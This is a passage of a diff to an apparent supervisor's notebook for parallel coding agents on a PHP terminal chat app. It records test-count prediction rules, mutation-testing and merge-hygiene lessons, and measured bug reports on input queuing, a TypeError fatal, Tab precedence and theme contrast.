+assertGreaterThanOrEqual-> OK (1 test, 2 assertions)
+assertLessThan          -> 1 assertion   (plain comparisons are NOT doubled)
+```
+
+**Scale, stated as two different things because they ARE two different things:**
+- **Repo-wide the distortion is small.** `grep -rho "assert\(Less\|Greater\)ThanOrEqual("` over
+  `sugar-crush/tests/` finds **142 static call sites**. If each ran exactly once that is +142 on
+  92,144, i.e. **0.15%**. ⚠️ **That is a FLOOR, not the answer** — a static count cannot see loop
+  iterations, and one such call inside a 281-iteration sweep contributes **562**.
+- **Per-bundle it can be enormous.** P8.4 reported **+1488 assertions** for +23 tests; the real
+  assert-CALL count is **~880**, a **~68% overstatement**, because 1344 of them came from two loops.
+
+**How to read a bundle's assertion delta from now on:** a large delta is evidence of loop iterations,
+not of properties pinned. P8.4's 724-assertion sweep buys **four** distinct properties, and its
+band-floor check is monotone so only the minimum at cols=80 is load-bearing. **Ask what a delta
+PINS, never what it totals** — and the proof is that the same 724 assertions failed to catch
+`intdiv($cols,3)` → `round($cols/3)`, because they assert the SUM (`band + 1 + column == cols`),
+which holds under any sizing policy.
+
+### (k) prediction rule — tests additive, assertions a LOWER BOUND, predicate not scope
+*(was round-44/46/48 blocks, lines 2940–2954, 2705–2717, 2441–2449)*
+
+### 🔴 THE PREDICTION RULE HAS CHANGED — ASSERTION COUNTS ARE NOT ADDITIVE ACROSS LANES
+
+Predicted **9215 / 127733**. Tests hit **9215 exactly** (two rounds running). Assertions came in at
+**127,781 — +48 over prediction**, and the cause is structural, not a lane error:
+
+**A lane that ships a census walking `src/` or `docs/` asserts per file and per paragraph, so a SIBLING
+lane adding prose raises THAT lane's assertion count with no code change on either side.** Measured by
+running lane a's three census files in both trees — same 93 tests, 21,747 assertions at merged master vs
+21,699 at lane a's own HEAD. Attributed exactly: `GlobFigureDriftTest` +46, `SymbolCitationDriftTest` +2,
+`EnvRosterDriftTest` 0.
+
+**So: predict tests from the deltas as before. Predict assertions as a LOWER BOUND whenever any lane's
+diff contains a guard that enumerates files or paragraphs — and say so when you state the prediction.**
+The two round-43 rules still hold and still work (re-measure after the fix stage; run and reconcile
+`git diff <base>..HEAD -- 'sugar-crush/tests/**' | grep -c '^+ *public function test'` in writing).
+
+
+
+### THE PREDICTION RULE, CORRECTED — PREDICATE, NOT SCOPE (E191)
+
+**Tests 9378, predicted exactly — fourth round running.** Assertions landed on **131610, exactly the
+additive lower bound, and the supervisor had predicted a strict overshoot. That was wrong.**
+
+**A new census inflates a merged total only when a sibling's additions fall inside its PREDICATE, not
+merely inside its scan scope.** Lane b's new scanners walk all of `tests/` but assert per fork site and
+per fixture; lane a's two new test files contain zero `pcntl_fork` calls, so nothing matched. Round 44's
+stale-figure census asserted once per PARAGRAPH of every file, where every sibling addition necessarily
+matches — that is why THAT one overshot by 48.
+
+**Keep predicting tests additively and assertions as a lower bound. Do not promise an overshoot just
+because a guard walks a directory a sibling touched.**
+
+
+
+### THE PREDICTION RULE HELD A SIXTH ROUND — AND E191's OVERSHOOT WAS FINALLY OBSERVED
+
+**Tests 9497, EXACT — sixth consecutive round** (9445 + 29 + 6 + 17). **Assertions predicted as a LOWER
+BOUND of 133583 and landed at 133585, two over** — the first time the bound has been genuinely loose, and
+the mechanism is exactly E191's: **lane c's new stderr site fell inside lane a's census PREDICATE, not
+merely its scan SCOPE**, so the merged census makes assertions neither lane made alone. Round 47's bound
+was tight because no lane's additions entered a sibling's predicate; round 48's is loose because one did.
+**The rule is now confirmed in both directions. Keep saying which kind of prediction you are making, and
+say WHICH sibling's predicate you expect to absorb WHAT.**
+
+### (l) a figure without its generator is not a measurement
+*(was round-41 block, lines 3550–3553)*
+
+**A FIGURE WITHOUT ITS GENERATOR IS NOT A MEASUREMENT.** Lane `b` shipped `989 / 3,862` in a commit
+message, reproducible from nothing, and its own review could not re-derive them. Every fuzz figure must
+carry its seed, its alphabet, its length bound, its trial count, and the PHP/ICU version. This is the
+same defect class as E69's "0 unexplained" over an alphabet containing no ZWJ.
+
+### (m) the fuzz alphabet is part of the fuzz's coverage
+*(was round-43 block, lines 3137–3139)*
+
+🔴 **THE TRANSFERABLE RULE: THE FUZZ ALPHABET IS PART OF THE FUZZ'S COVERAGE, AND IT HAD BEEN WRITTEN TO
+MATCH THE CASES ALREADY KNOWN.** Same family as E69's "0 unexplained" over an alphabet containing no ZWJ.
+When a fuzz reports zero, ask what its alphabet cannot express before you believe it.
+
+### (n) never add a skipped test to close a timing-dependent branch
+*(was round-41 block, lines 3466–3470)*
+
+**NEW — NEVER ADD A SKIPPED TEST TO CLOSE A TIMING-DEPENDENT BRANCH.** E61's all-bounded branch is
+reachable only via per-hook `proc_open` overhead: four hooks each declaring 10ms **denied on some runs
+and fitted on others**. The first cut called `markTestSkipped()` on the fitted case — which would have
+put a second skip in the suite whose skip count is the closure alarm above. It is now pinned with a
+`BoundedHookInterface` double. **A coin flip dressed as an assertion is worse than a test double.**
+
+### (o) every width claim carries its PHP version (box is 8.3.6 only)
+*(was round-41 block, lines 3477–3483)*
+
+**E68 PROVES THE VERSION AXIS IS REAL. Put a PHP version on every width claim.** E68's recorded
+mechanism was **inverted**, and its prescribed fix would have changed nothing: `Width::string()` was the
+splitter, because `grapheme_str_split()` is **PHP 8.4+ and absent on this box's 8.3.6**. It was a
+**PHP-8.3-only defect recorded as unconditional**, and CI runs `PHP_VERSIONS = ['8.3', '8.4']` — so a
+lane can measure green here and go red in CI. **This box has only PHP 8.3.6.** Use ext-intl's
+`grapheme_extract()`/`grapheme_strlen()` as an ICU oracle; prefer fixes that REMOVE a version-conditional
+path over fixes that pick a branch.
+
+### (p) the /tmp prohibition in every brief; cite SYMBOLS not line numbers; commit incrementally in-lane
+*(was round-41 block, lines 3491–3494)*
+
+**Keep the `/tmp` prohibition in EVERY brief:** never glob-delete `/tmp/sc_chat_tool_*` or
+`/tmp/crush-hook-payload-*`; unique probe names, exact-path deletes only. **Agents commit INCREMENTALLY
+in-lane.** **Cite SYMBOLS, not line numbers** — round 40 produced a fifth instance inside the lane that
+had just been told about the pattern.
+
+### (r) rewrite a stale justification; never delete it
+*(was round-41 block, lines 3488–3489)*
+
+**Rewrite a stale justification; never delete it.** WHAT IT SAID / WHAT IS TRUE NOW / WHY THIS STILL
+EARNS ITS PLACE. Delete the reasoning and the next reader deletes the guard.
+
+### (s) a hypothesis in a status block reads one round later like a measurement — mark hypotheses
+*(was round-41 block, lines 3485–3486)*
+
+**A hypothesis in a status block reads, one round later, exactly like a measurement.** Mark hypotheses
+as hypotheses in this file.
+
+### (t) a mutation harness whose restore is a later step in the same agent does not survive the agent dying (E168)
+*(was round-45 block, lines 2824–2837)*
+
+### 🔴 A MUTATION HARNESS WHOSE RESTORE IS A LATER STEP IN THE SAME AGENT DOES NOT SURVIVE THE AGENT DYING (E168)
+
+Round 45's first launch died at a session limit with 5 of 9 agents mid-flight. Lane a's tree was left dirty
+with `src/Chat.php` and `tests/Cli/BootstrapLaunchNoticeRoutingTest.php` carrying a figure rewritten to
+"nineteen" in a paragraph stating `Bootstrap.php` holds sixteen calls — incoherent on its face, and
+`TRANSCRIPT_SEAM_CALL_SITES` is 16, so it was an oracle probe, not fix work (`Chat.php` is not even in
+lane a's file list). No backup existed. **Had the resume handed that tree to a fresh fix agent it would
+have committed the nonsense or chased a red it did not cause.**
+
+**Three parts, all of which lane c's `mut.sh` had and lane a's did not:** (1) the backup is written
+BEFORE the mutation; (2) the restore is VERIFIED by `git status --porcelain` returning empty; (3) 🔴 **the
+supervisor checks every lane tree for a dirty worktree BEFORE merging**, not only at the end. Lane c's
+harness also exits 94 on a no-op and prints the actual `+`/`-` lines — it caught a no-op that would have
+read as a survival, and an rc-255 PHP fatal that is neither a kill nor a survival.
+
+### (u) measure the floor at the commit the lanes branch from, not the merge commit (E167); lane b revert technique
+*(was round-45 block, lines 2796–2810)*
+
+### 🔴 MEASURE THE FLOOR AT THE COMMIT THE LANES BRANCH FROM — NOT AT THE MERGE COMMIT (E167)
+
+Round 45's brief carried `9215 / 127781`, measured at round 44's merge commit `98d59bfb`. **The lanes
+branched from `06126017`, three commits later, and one of those three was the supervisor's own E131 prose
+fix to `src/Config/LayeredSettings.php`.** `GlobFigureDriftTest` asserts once per paragraph of every
+`.php` under `src/`, so that fix moved the assertion count by +1. True base: **`9215 / 127782`**.
+
+Lane a reverted its diff and observed it; lane b reverted all four of its files and observed it; lane c
+flagged it and **correctly refused to adjudicate** without a checkout that would dirty its tree. **The
+brief was the outlier and the lanes were right.** Cut the lane copies, then measure the floor in one of
+them (or at that exact commit) immediately before launching.
+
+⚠️ Lane b's revert technique is the one to copy: `git show <sha>:<path> > <path>`, **never**
+`git checkout <sha> -- <path>`, which STAGES — and a staged-but-restored file made `git diff --quiet` lie
+once in lane a this round. Follow a pathspec checkout with `git reset -q HEAD -- <dir>`.
+
+### (v) census literals are counters, not prose
+*(was round-32 block, lines 5154–5158)*
+
+**Census literals are COUNTERS** (`BuiltInToolCorpusTest` now **279**). "No new `src/` file ⇒ no
+census collision" is FALSE — round 31's `lsp` bundle added no `src/` file and still moved
+`ContainedPathInventoryTest` and added 7 `ReadPathCensusTest` rows, because those track read sites.
+On a conflict confined to a count, **re-derive and continue**; STOP for anything else. See
+`crush_code_concurrency.md` §5.2e.
+
+### (w) sweep for derived values, not just the stale literal
+*(was round-33 block, lines 4655–4660)*
+
+- **A CORRECTED CONSTANT LEAVES CORRECTED-LOOKING ARITHMETIC BEHIND.** `7957b2be` swept five places
+  that *quoted* the superseded 393,216 and missed three that were **derived from it**:
+  `contextWindow()`'s tier figures `~275,251 / ~334,233 / ~373,555` are 70/85/95% of 393,216. A grep
+  for the stale number cannot find a number computed from the stale number. The lane found them and
+  corrected them to `~733,999 / ~891,284 / ~996,141`. **Sweep for the derived values, not just the
+  literal.**
+
+### (x) verify by domain, not by token
+*(was round-32 block, lines 5082–5085)*
+
+**THE RULE: verify by domain, not by token.** Every failure above is a true statement about the wrong
+scope. Before trusting any `file:line` in the plan, confirm it still points at the thing it names — six
+citations had rotted onto unrelated docblocks (the table is in `crush_code.md`). Grepping for a symbol
+the plan named is necessary and **not** sufficient: the symbol can be gone while the defect remains.
+
+### (y) a test over a hand-maintained list inherits the list's omissions — derive the list
+*(was round-34 block, lines 4264–4265)*
+
+**The rule: a test over a hand-maintained list inherits that list's omissions. Derive the list, or
+the test only proves what someone remembered to type.**
+
+### (z) re-open the file at the line range before repeating any citation you did not personally take
+*(was round-33 block, lines 4603–4604)*
+
+  **Rule: re-open the file at the line range before repeating any citation you did not personally
+  take, including one from your own earlier document.**
+
+### (aa) a correction is a claim and gets measured like any other; never edit the record straight from a lane's correction
+*(was round-36 block, lines 4071–4080)*
+
+**Rules:**
+1. **A correction is a claim and gets measured like any other.** Round after round these briefs have
+   said "report a wrong premise rather than routing around it" — this is the other half: *a reported
+   wrong premise must itself be verified before the record is changed.*
+2. **Never edit the record straight from a lane's correction.** Confirm it first, or route it through
+   the reviewer.
+3. Note the same lane's OTHER corrections in the same breath were **right** (`Chat.php:6478` sync
+   `run()`, `:6390` dispatch, `:6459` `workflowRun()`; the recorded `:6479` was a genuine off-by-one).
+   **A source that is right three times out of four still has to be checked the fourth time** — being
+   mostly right is what makes a false correction dangerous.
+
+### (ab) consensus among comments measures a shared ancestor, not the code
+*(was round-33 block, lines 4606–4611)*
+
+- **THE DOCBLOCKS CAN AGREE WITH EACH OTHER AND ALL BE WRONG.** Three separate places
+  (`AgentManager.php:416`, `Bootstrap.php:914`, `docs/PERMISSIONS.md:193`) call the permission
+  approver a "BLOCKING closure". The implementation it describes is a `Deferred` + TEA state machine
+  that cannot be called from a `bool`-returning closure at all. Corroboration across files is not
+  evidence — the three agree because they were written from the same intent, before the
+  implementation diverged. **Consensus among comments measures a shared ancestor, not the code.**
+
+### (ac) lane hygiene — keep the lane dirs until AFTER the merged floor is measured; check deletion order
+*(was round-44 block, lines 3087–3093)*
+
+`/home/sites/crush-lane-{a,b,c}` removed and `drain44-{a,b,c}` deleted — **but only after** confirming per
+lane that every file in the lane's diff is byte-identical in master (the only two that differ are the
+knowingly shared `docs/SETTINGS.md` and the backlog), and that `git branch --merged master` listed all
+three. Do it in that order; a lane dir removed before the check is unrecoverable.
+
+⚠️ **Keep the lane dirs until AFTER the merged floor is measured** — round 44 needed lane a's tree alive to
+attribute the +48 assertion gap, and it would have been unrecoverable an hour later.
+
+### (ad) E63 shared-temp false red — a run that fails ONLY on that assertion is not a red suite
+*(was round-38 block, lines 3811–3815)*
+
+⚠️ **NEW — E63 changes how a red suite is read.** `ChatTest::tearDownAfterClass` globs the SHARED temp
+dir and attributes any concurrent process's `sc_chat_tool_*` files to itself, so two lanes running suites
+at once can trip it. **A run that fails ONLY on that assertion is not a red suite** — re-run
+`vendor/bin/phpunit --filter ChatTest` alone to disambiguate, and prefer to take floor measurements when
+no lane is running a suite. It is false-positive-only: it cannot hide a leak, only invent one.
+
+### (sweep-1) a row added to a list tests iterate inflates the delta with tests that are not yours
+*(was round-35 block, lines 4012–4014 (final-sweep addition))*
+
+**The rule: when a change adds a row to a list that tests iterate, the assertion delta includes tests
+that are not yours and did not change.** More generally — *check whether two corroborating methods
+share a premise before treating them as independent.*
+
+### (sweep-2) securing the data a walk RETURNS is not securing the walk
+*(was round-35 block, lines 4175–4177 (final-sweep addition))*
+
+**The rule: securing the data a walk RETURNS is not securing the walk. Gate the traversal and the
+values separately, and never let a census row answer "is this path safe?" with a sentence about the
+string rather than about what it resolves to.**
+
+### (sweep-3) a guard written from the sanitiser's byte class tests the sanitiser, not the surface
+*(was round-35 block, lines 4202–4205 (final-sweep addition))*
+
+**The rule: a guard test written from the sanitiser's byte class tests the sanitiser, not the
+surface.** Write it from the property the surface needs — here, *a report has exactly the number of
+lines the renderer intended, whatever the fields contain* — and it fails for any escape, including the
+ones the sanitiser was never meant to cover.
+
+### (sweep-4) a green suite is not a pinned invariant — mutate the clause or you have not pinned it
+*(was round-41 block, line 3496 (final-sweep addition))*
+
+**A green suite is not a pinned invariant. Mutate the clause, or you have not pinned it.**
+
+### §B — the W1 LESSON trio (was round-32-era W1 block, lines 5882/5895–5899/5901–5902)
+*(item 35)*
 
 **Re-verify an agent's mutation table yourself, with your own edits, before believing a bundle.**
-
-W1's chain produced three false "it's dead" reports, each caught only by the next gate:
-
-1. The implementation round reported **8 mutations, 8 killed**. An independent reviewer ran 29 and left
-   **11 surviving**, including that the bundle's headline invariant was provably FALSE for emoji
-   clusters.
-2. Fix round A reported **all 11 now dead** — and disclosed, unprompted, that **5 of the 11 definitions
-   were its own reconstructions** because the reviewer's harness took them as argv and never wrote them
-   down. Comparing against the reviewer's table, **4 of those 5 were different mutations entirely.** I
-   applied the reviewer's real definitions myself: **MU11, MU12, MU25, MU29 all still SURVIVED.**
-3. Fix round B closed all four. I re-ran all four myself with my own edits before committing.
 
 **And the reason those four resisted is the transferable insight:** all three `$labelRoom` mutations
 were unkillable by ANY width assertion **by construction**, because fix round A's own `hardFit()`
@@ -5901,318 +1137,16 @@ prove — often the answer is "nothing they used to".
 Practical rule now in force: **write mutation definitions as the exact edit, verbatim, in the report.**
 "MU11" is not a definition. `$labelRoom = … - Width::of($status) - 1;` → drop the `- 1` is.
 
-## ✅ BUNDLE W2 IS COMMITTED — `a8d8ec75`. Input works mid-turn and Enter queues.
-
-**Suite verified by me personally, not taken from the agent's report: 7602 / 88074 / 1, exit 0**
-(entry baseline 7577 / 87648 / 1). 29 mutations defined as verbatim edits, all 29 killed by the new
-`tests/Chat/InFlightInputQueueTest.php` (25 tests, 390 assertions). Invariants re-checked at the
-gate: config md5 unchanged, stash list 9, 16 vendor symlinks so the skip count stayed 1,
-`phpunit.xml` untouched, `check-path-repos --no-lib-path-repos` rc=0.
-
-**The measured finding that shrank the bundle:** the async half was already done, so the user's
-framing ("it shoudl be doing these requests asynchronously") was the one thing measurement
-contradicted — nothing was blocking. It was one policy `return` plus a hidden caret.
-
-**Six existing tests changed, and every one had pinned the OLD policy** —
-`testKeystrokesIgnoredWhileInFlight` became `testTypingReachesTheDraftWhileATurnIsInFlight`: same
-property, opposite value. That is the category to scrutinise hardest in any review, and it is why the
-review brief pointed at those six diffs by name.
-
-**Two drain decisions worth remembering:** the double-Escape cancel deliberately HOLDS the queue
-(not dispatched, since it may be what the user was stopping; not dropped), and a spend-cap-refused
-prompt goes back at the queue HEAD because `spendCapTurnRefusal()` keeps the draft and writes no
-echo, so it would otherwise vanish with the restored draft.
-
-## ✅ BUNDLE W5 IS COMMITTED — `f8fd9cfa`. Three commands no longer kill the app.
-
-**A USER-REPORTED FATAL, and the most severe report so far.** A bare `/websearch` printed its usage
-line and then died: *"Argument #1 ($msg) must be of type SugarCraft\Core\Msg, int given"*.
-
-Three sites — `/share`, `/websearch`, `/agents` — ended their failure branch with
-`return [$this, static fn() => print $output];`. **`print` is an EXPRESSION evaluating to `int 1`**,
-so the closure is a `Cmd` returning an int; `Program::scheduleCmd()` dispatches whatever non-null a
-Cmd returns and `dispatch()` requires a `Msg`. Any non-zero exit from those three took the app down,
-and `/agents` is one Ctrl+A away.
-
-Writing to stdout was the wrong shape even before the TypeError — the screen belongs to candy-core's
-frame renderer. The `/agents` site's own comment said "output error but don't add to history", which
-is why the failure had nowhere to appear. All three now route through one
-`commandFailureResponse()`: the command is echoed, the output lands as **`Role::System`** (not
-assistant — history is replayed to the provider, so a failure notice filed as a model turn becomes
-something the model believes it said), and the Cmd is null.
-
-**Why nothing caught it, which is the transferable part:** the suite covered these three commands
-only on their SUCCESS paths, where the Cmd is null. The failure branch was the one line of each
-handler no test entered — and it is the line that runs when a user gets an argument wrong, the
-ordinary case rather than the exotic one. **Worse, one test pinned the bug AS the feature:**
-`ChatTest::testPaletteEnterOnShareSessionDispatchesRealHandlerAndCloses` asserted
-`assertNotNull($cmd)` and its comment named "the print-closure path" as its proof that dispatch
-reached the real handler. Its claim was right and was kept; the evidence it cited was the crash.
+### proven against the unfixed code rather than asserted (revert the fix; watch the new tests fail)
+*(was W5 block, lines 5952–5955 (item 38))*
 
 **Proven against the unfixed code rather than asserted:** with the three call sites reverted, 6 of
 the 7 new tests fail. That exercise also caught a vacuous pass in my own new test —
 `testTheFailureNoticeIsNeverAnAssistantTurn` indexed `$added[1]` without counting first, so against
 the unfixed build (which appended nothing) it compared a role against an undefined key and passed
-with a warning. Suite: **7609 / 88105 / 1, exit 0.**
 
-## ⚠️ BUNDLE W4 IS QUEUED — Tab does not complete a partial `/command`. USER-REPORTED.
-
-Reported: Tab *"should expand your typed command to the full command currently highlighted .. currntly
-it switches your active other window (like between skills/tools/agents/etc) which is fine normally but
-when typing a /command and its showing matching command results the bhavior should chang"*.
-
-**Measured as a PRECEDENCE problem, not a missing feature.** Bare Tab never reaches `Chat`:
-`src/Tui/KeyboardHandler.php:174` claims it **unconditionally** inside the shell's "does the shell own
-this key" predicate and cycles panes. `Chat` has no bare-Tab arm at all — its three `KeyType::Tab`
-hits are a comment at 1343 and two Ctrl+Tab arms (1475, 4787) — so bare Tab falls to the match
-default and leaves the buffer alone. The slash-menu state is already public
-(`slashMenuMatches()`/`slashMenuMatchResults()`/`slashMenuIndex()`, ~8290-8343) and "the popup is
-showing" is exactly `slashMenuMatches() !== []`.
-
-**The idiom to follow already exists two lines below the Tab claim:** the `Escape` arm is conditional
-on `$app->pane !== Pane::Chat`, and `shellOwnsKeyboard($app)` above it is the established
-modal-owns-the-keyboard predicate. So a conditional Tab claim is the existing pattern.
-
-**The test that matters** drives a real keystroke sequence through the shell — type `/comp`, then bare
-Tab — because a test that calls Chat's Tab arm directly cannot see the precedence bug and would pass
-on the broken build. The negative must be pinned too: with no slash menu open, bare Tab must still
-cycle panes, which is the behaviour the user called "fine normally". And no keystroke may put a
-literal `\t` in the buffer (`KeyHelpTest`'s byte map, asserted both ways).
-
-## ⚠️ THE ORIGINAL W2 BRIEF (kept for its measurements)
-
-**Second live bug report, same priority class as W1.** Verbatim: *"when i send a chat message and its
-processing the request im unable to type new text into the chat . im alaso unable to use things like
-Ctrl-P to bring up the command pallete … new messages should be typable and sendable (well really
-queued for processing if its mid processing the previous message) during that time"*, then *"it shoudl
-be doing these requests asynchronously anyways it shouldnt be blocking"*.
-
-**Full measured brief: `/tmp/…/scratchpad/w2-measured.md` (128 lines).** The headline, because it
-decides the size of the bundle: **the async half is already done.**
-`Chat::scheduleBackendCompletion()` (`:5231`) returns `Cmd::promise(fn() => $backend->completeAsync(…))`
-and `completeAsync()` forks a child. Driven proof the loop delivers keystrokes mid-turn: with
-`inFlight: true`, an `Escape` KeyMsg mutates state (`lastEscapeAt` null → set).
-
-**The defect is one policy return: `src/Chat.php:1141-1146`,** `if ($this->inFlight) { return [$this,
-null]; }` — a blanket swallow, so everything lexically below it is dead for the whole turn. Measured
-`inFlight` vs idle for the same KeyMsg: `Char 'x'` leaves `inputBuf` empty vs `'x'`; `Ctrl+P` leaves
-`palette` null vs OPEN.
-
-**Do not just delete the swallow** — its stated reason ("the user racing ahead and queuing another turn
-into a half-formed history") is real. Split it: keys reach the input box and the overlays, and **Enter
-enqueues instead of dispatching**.
-
-Two constraints from the brief: `dispatchTurn()` (`:4502`) has exactly two callers and its docblock
-warns a third copy is where the generation, cancellation token, checkpoint or title Cmd goes missing —
-**the drain must call it**; and `scheduleParkedCompaction()` (`:6287`) already implements "hold a
-submission, dispatch later" for the 85% tier, so reuse that shape rather than inventing queue state.
-
-**The census trap:** `grep "'inFlight' => false" src/Chat.php` gives 26 — but 4 are comment prose and
-one (`:4586`) is a serialized checkpoint payload, not a state transition. **21 are real writes**, and a
-queue draining at only one strands the user's message. One of the two that settle a real turn is the
-CANCEL path, where draining would send a message the user just tried to stop.
-
-**Two more seams I measured after writing that brief, both load-bearing:**
-
-1. **`Renderer.php`'s `$cursor = $chat->inFlight ? '' : '█';` HIDES the input cursor while a turn
-   runs.** So even with typing unblocked the box still looks dead — this is the second half of the
-   user's complaint and the feature is invisible without it. (Re-grep the line; `Renderer.php` was
-   rewritten by W1.)
-2. **The 21-site census collapses to ONE real drain point.** `finishToolCalls()` sets
-   `'inFlight' => true` (`:2333`), so a tool-calling turn keeps running and settles at a LATER
-   `AssistantMsg`. The only place an ordinary turn ends is `update()`'s AssistantMsg no-tool-calls exit
-   (`:905-910`), which returns a **null Cmd** — and that null is exactly where the drained turn's Cmd
-   goes. `:1106` is the cancel path and draining there is WRONG. The rest are command responses that
-   set and clear `inFlight` inside their own response; the ones needing an individual decision are the
-   compaction paths and `backgroundDispatch()`, because a PARKED submission deliberately holds
-   `inFlight` true with no turn running.
-
-**The subtle test this bundle can fail:** a queue that drains on any `AssistantMsg` fires MID-TURN on a
-tool-calling turn. `finishToolCalls()` keeping `inFlight` true is what makes that a live hazard.
-
-Brief: `/tmp/…/scratchpad/w2-brief.md` (184 lines) + `w2-measured.md` (128 lines), both self-contained.
-
-## ⚠️ BUNDLE W3 IS QUEUED — the shell chrome ignores the theme. USER-REPORTED.
-
-**Third live bug report, 2026-08-19, same priority class as W1/W2.** Reported as *"when showing the
-menus up top none of them have borderes making where the menu listing txt starts/ends difficult to
-tell at a glance ... (no the menu names the menu items list)"*, then corrected by the user a minute
-later: *"i stand corrrectd.. there are borderes.. just foreground matchs background color so invis"*.
-
-**The user's correction is the right diagnosis and it is sharper than the original report.** Do not
-implement the first version of this bug — there is nothing to add. Measured:
-`MenuBar::dropdownLines()` (`src/Tui/Components/MenuBar.php:431-440`) already draws a full box, and a
-probe of `renderDropdown()` with menu 1 open returns 12 rows, every one exactly 18 cells wide, with
-matched `┌─…─┐` / `│ … │` / `└─…─┘`. `Tui/Renderer.php:400` splices it in AFTER `clipWidth`/`clipTail`
-specifically so it cannot be trimmed. Nothing is missing and nothing is clipped.
-
-**The root cause is that `src/Tui/` is theme-blind, and it is the whole directory, not the menu.**
-
-| | measured |
-|---|---|
-| `src/Tui/` files with hardcoded `Color::hex('#…')` | **10** (~37 distinct colors) |
-| `src/Tui/` files that consult `Theme` | **0** — `SettingsPane`'s single `Theme` hit only *lists* theme names |
-| `src/Renderer.php`, the transcript | fully themed: `$theme->border`, `$theme->userLabel`, `$theme->systemLabel` |
-
-`MenuBar` does not import `Theme` at all (`grep -c Theme` → **0**) and hardcodes `#00ffaa` (active),
-`#fde68a` (title), `#6b7280` (border), `#e5e7eb` (item text), `#7d6e98` (inactive tab).
-
-**Why that produces "foreground matches background":** `Theme::adaptive()` DETECTS the terminal
-background — `TerminalBackground::isDark()` over an OSC 11 query plus `COLORFGBG` — and returns a dark
-or a light palette accordingly. So on a light terminal the transcript repaints for light and the shell
-chrome stays painted for dark: a mid-gray `#6b7280` border and near-white `#e5e7eb` item text, both of
-which disappear against a light background. The same applies to any `/theme` switch: it moves the
-transcript and leaves the shell behind.
-
-**A design constraint to settle BEFORE any agent starts editing, because there is no obviously right
-answer and inventing one silently is how this goes wrong:** `Theme` exposes only `name`, `markdown`,
-`border`, `userLabel`, `assistantLabel`, `systemLabel`. There is **no background token, no muted/dim
-token and no selected/accent token** — and the shell needs all three (the dim border, the `(empty)`
-and inactive-tab gray, the `#00ffaa` selected row). So this bundle must either add tokens to `Theme`
-(and then every `Theme` factory, `byName()`, `adaptive()`, `default()` and `pair()` must set them) or
-map the shell onto the four that exist and accept losing a distinction. **Measure which before
-choosing** — and whichever it is, the fix is not complete until a light-background run is driven, since
-that is the only configuration in which the reported symptom appears at all.
-
-**QUANTIFIED, and it moves the surface one step from where BOTH of us put it.** `Color::luminance()`
-is a proper WCAG relative luminance, so the contrast ratio against each palette's own background is
-computable. Measured for all five of `MenuBar`'s hardcoded colours:
-
-| hardcoded colour | role | on dark `#0e0e14` | on light `#fafafa` |
-|---|---|---|---|
-| `#00ffaa` | selected dropdown row | 14.55:1 | **1.27:1 — invisible** |
-| `#fde68a` | menu title | 15.45:1 | **1.19:1 — invisible** |
-| `#e5e7eb` | dropdown item text | 15.54:1 | **1.19:1 — invisible** |
-| `#6b7280` | dropdown border | 3.98:1 | 4.63:1 — visible |
-| `#7d6e98` | inactive pane tab | 4.17:1 | 4.42:1 — visible |
-
-**All five pass on dark; three of five are invisible on light — and the two that SURVIVE are the
-borders.** So the border glyphs are not the casualty: the item text, the titles and the selected-row
-highlight are. The user's first report ("where the menu listing txt starts/ends difficult to tell")
-described the text washing out, which makes a box with visible edges read as edgeless; the user's own
-correction then named the border, and the measurement says the border is fine. **Both readings had the
-mechanism right and the surface wrong, and only the ratio settles it.** Note the practical
-consequence, which is worse than cosmetic: at 1.27:1 the user cannot see which row Enter would run.
-
-**A coincidence worth naming, because it says where these colours came from:** `#6b7280` is exactly
-the LIGHT palette's `muted` and `#e5e7eb` is exactly its `border` — the light palette's own tokens,
-frozen into the wrong roles. These were eyeballed against one background and then rendered against
-whatever the terminal is.
-
-**This also confirms the detection half is working, which narrows the fix.** With the transcript
-themed and the shell not, a light terminal produces exactly one broken surface — the shell — which is
-what was reported. Had `TerminalBackground::isDark()` been wrong, the transcript would look wrong too.
-So do NOT go looking at the detector.
-
-**THE DESIGN QUESTION IS SETTLED, and cheaply — do not add new colours.** `Crush\Theme::pair()`
-(`src/Theme.php:115`) is the ONLY construction site of `Crush\Theme` in the entire codebase (one
-`new self(`), and it already receives a `SugarCraft\Sprinkles\Theme` carrying **13** tokens:
-`foreground`, `background`, `primary`, `secondary`, `accent`, `muted`, `error`, `warning`, `success`,
-`info`, `border`, `separator`, `cursor`. It projects **four** of them and discards nine. So the shell's
-missing background/muted/accent tokens **already exist upstream in both palettes** —
-`SprinklesTheme::dark()` and `::light()` — and widening `Crush\Theme` costs one constructor plus one
-`pair()` body, with correct light AND dark values for free. Inventing hex values, or mapping the shell
-onto the four existing fields and losing a distinction, are both the wrong answer now.
-
-**THE TEST MUST PIN CONTRAST, NOT PRESENCE — this is the whole point of the bundle.** A test asserting
-"`MenuBar` uses `$theme->border`" is the recurring defect in its purest form: it pins that a clause is
-present and says nothing about whether the result is legible, and it would pass against a theme whose
-border equals its background. Assert the RATIO: for every colour the shell paints, against the
-resolved background, in BOTH palettes, require ≥3:1 for chrome/glyphs and ≥4.5:1 for text. Written that
-way the assertion covers all ten `src/Tui/` files and every theme added later, and it would have
-failed on the build the user is running — the table above is that test's output.
-
-### W3 CORRECTED BY THE USER AGAIN — the contrast table above measures a background NOTHING PAINTS
-
-**The user reported using the `ansi` theme, where the menu border is invisible — and asked whether
-that contradicts the measurement. It does, and finding out why widened the bundle.**
-
-All six themes, each shell colour against **that theme's own background token**:
-
-| theme | bg token | selected `#00ffaa` | title `#fde68a` | item `#e5e7eb` | border `#6b7280` | inactive `#7d6e98` |
-|---|---|---|---|---|---|---|
-| dark | `#0e0e14` | 14.55 | 15.45 | 15.54 | 3.98 | 4.17 |
-| light | `#fafafa` | **1.27** | **1.19** | **1.19** | 4.63 | 4.42 |
-| dracula | `#282a36` | 10.77 | 11.43 | 11.50 | **2.95 FAILS** | 3.09 |
-| tokyoNight | `#1a1b26` | 12.93 | 13.72 | 13.80 | 3.54 | 3.71 |
-| ansi | `#000000` | 15.88 | 16.86 | 16.96 | 4.34 | 4.56 |
-| adaptive | — | resolves to the `dark` or the `light` row at runtime via `TerminalBackground::isDark()` | | | | |
-
-**Under `ansi` every shell colour PASSES against the token, and the user sees an invisible border. The
-table is wrong, not the user — and the reason is a discarded measurement.**
-
-`BackgroundColorMsg` (candy-core) carries the terminal's real background as `public readonly int $r`,
-`$g`, `$b` plus a `hex()`. `TerminalBackground::observe()` (`src/Tui/TerminalBackground.php:89`) does:
-
-    self::$observed = $msg->isDark();
-
-**The app sends an OSC 11 query, receives the terminal's true background RGB, and reduces it to one
-bit.** So no contrast decision anywhere in this app — including every number in the table above — is
